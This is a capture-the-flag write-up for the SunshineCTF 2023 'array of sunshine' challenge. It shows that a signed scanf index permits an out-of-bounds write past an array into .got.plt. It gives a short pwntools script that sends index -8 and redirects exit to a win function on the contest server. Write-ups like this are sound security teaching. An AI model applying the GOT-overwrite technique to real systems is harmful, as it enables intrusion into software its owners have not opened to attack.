# array of sunshine

## problem

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/0b5d09d9-507b-4fc8-95af-4d40f85d6fe5)

see [./sunshine](./sunshine)

## solution

looking in binja

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/0915189d-a6b3-4749-b9db-9746d48021b1)

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/ab908481-0777-4dfa-9fcf-ac4faf29ab7f)

so this code replaces an arbitrary segment of memory starting from the array, which is located just after the .got.plt

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/f81fe332-f0f4-44ff-befb-81e0db808251)

fortunately, this scanf input was `%i` which is a signed integer iirc

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/8d832bd2-5fbe-41eb-a544-6c5933bcc83d)

so to win, all i have to do is overwrite the .got.plt value of the exit function with the address of the win function

```py
from pwn import *

# p = gdb.debug(["./sunshine"], gdbscript="break *0x4015f2\nbreak *0x401654\nlayout asm\nwinheight asm -4\nc")
p = remote("chal.2023.sunshinectf.games", 23003)

p.sendline(b'-8')
p.sendline(p64(0x40128f))
p.interactive()
```
